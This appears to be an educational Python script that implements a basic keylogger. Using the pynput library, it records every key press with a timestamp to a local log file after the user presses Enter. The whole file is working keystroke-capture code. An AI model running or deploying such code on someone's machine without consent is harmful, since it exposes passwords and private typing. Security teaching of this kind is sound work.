"""
This module is recording keyboard keystrokes
and used to demonstrate monitoring and security risks
Commonly discussed in malware analysis and cybersecurity education

Development steps:
=> Capture keyboard input events
=> Record pressed keys
=> Store logs locally
=> Monitor keystrokes in real time
=> Stop and save logging session safely

Note:This simple keylogger is for educational purposes only.

"""

from pynput import keyboard
import time


log_file = "keylogger_log.txt"

def on_press(key):
    try:
        #Record the key press with timestamp
        with open(log_file, "a") as f:
        #write the key and timestamp into the log file    
            f.write(f"{time.ctime()}: {key.char}\n")

#Handle special keys(shift,ctrl,alt,etc) which is not a character
    except AttributeError:
        with open(log_file, "a") as f:
            f.write(f"{time.ctime()}: {key}\n")


#start the keylogger and listen for key presses
def start_keylogger():

# Use pynput listener to see the key presses
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

input("Press Enter to start keylogger...")
start_keylogger()
